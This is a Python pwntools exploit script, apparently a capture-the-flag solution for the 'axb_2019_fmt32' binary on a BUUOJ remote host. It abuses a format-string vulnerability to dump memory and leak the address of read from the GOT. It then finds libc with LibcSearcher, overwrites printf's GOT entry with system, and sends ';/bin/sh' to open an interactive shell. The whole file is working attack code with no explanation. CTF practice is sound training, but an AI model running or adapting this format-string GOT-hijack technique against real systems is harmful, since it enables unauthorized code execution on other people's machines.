#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()
#context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process("./axb_2019_fmt32")
	#elf = ELF("./axb_2019_fmt32")
else:
	p = remote("node3.buuoj.cn",27503)
	#elf = ELF("./axb_2019_fmt32")

def dump4text(address):
	payload = "%10$s.TMP" + p32(address)
	sl(payload)
	success(hex(address))
	ru('Repeater:')
	info = ru(".TMP")
	info = info[:-4:]
	remain = p.recvrepeat(0.2)
	return info

def dump2file(start,stop):
	text_segment = ''
	try:
		while(start<=stop):	#while True:
			info = dump4text(start)
			text_segment += info
			start += len(info)
			if len(info) == 0:
				start += 1
				text_segment += '\x00'


	finally:
		f = open('blind_pwn', 'wb')
		f.write(text_segment)


###leak program###
start = 0x8048000
stop = 0x8048b00
#dump2file(start,stop)

###leak libc###
read_got = 0x804A010
read = u32(dump4text(read_got)[:4])

libc = LibcSearcher('read',read)
libc_base = read - libc.dump('read')
system = libc_base + libc.dump('system')
success(hex(libc_base))

###hijack GOT###
printf_got = 0x804A014

payload = fmtstr_payload(8,{printf_got:system},numbwritten=10)
sl(payload)
sl(';/bin/sh\x00')

###get shell###
ia()
